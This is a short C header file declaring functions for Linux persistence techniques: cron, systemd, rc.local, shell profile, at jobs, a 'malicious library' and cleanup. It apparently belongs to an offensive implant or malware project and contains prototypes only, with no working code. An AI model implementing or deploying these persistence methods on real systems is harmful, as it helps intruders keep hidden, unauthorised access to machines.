#ifndef PERSISTENCE_H
#define PERSISTENCE_H

int setup_cron_persistence();
int setup_systemd_persistence();
int setup_rc_local_persistence();
int setup_profile_persistence();
int setup_at_persistence();
int setup_malicious_library();
int setup_persistence(int method);
void cleanup_persistence();

#endif